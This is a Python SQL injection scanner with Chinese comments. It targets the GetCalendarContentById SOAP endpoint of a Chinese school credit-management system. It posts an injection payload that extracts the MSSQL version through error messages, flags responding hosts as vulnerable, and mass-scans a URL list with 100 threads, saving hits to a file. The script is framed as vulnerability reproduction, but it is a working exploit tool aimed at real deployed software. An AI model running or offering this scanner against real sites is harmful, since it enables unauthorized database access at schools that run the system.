# 导包
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止他报错
RED = '\033[91m'
RESET = '\033[0m'

# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                            author:YeahSir
                                            version:1.0.0
                                            BY:某学分制系统-GetCalendarContentById-SQL注入漏洞复现
"""
    print(banner)

# poc模块
def poc(target):
    url = target+"/WebService_PantoSchool.asmx"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", "Content-Type": "text/xml; charset=utf-8", "Connection": "close"}


    data="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n  <soapenv:Header/>\r\n    <soapenv:Body>\r\n      <tem:GetCalendarContentById>\r\n        <!--type: string-->\r\n        <tem:ID>1' OR 1 IN (SELECT @@version) AND '1'='1</tem:ID>\r\n      </tem:GetCalendarContentById>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>\r\n\r\n\r\n"
    try:
        res = requests.post(data=data,url=url,headers=headers,verify=False,timeout=10)
        if  res.status_code == 500 and 'Microsoft SQL Server' in res.text :
                print(f'{RED}[+] 该url{target}存在SQL注入漏洞{RESET}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
        else:
            print(f'[-] 该站点{target}不存在SQL注入漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target},请手动测试 错误信息：{str(e)}")

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a testing tool")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()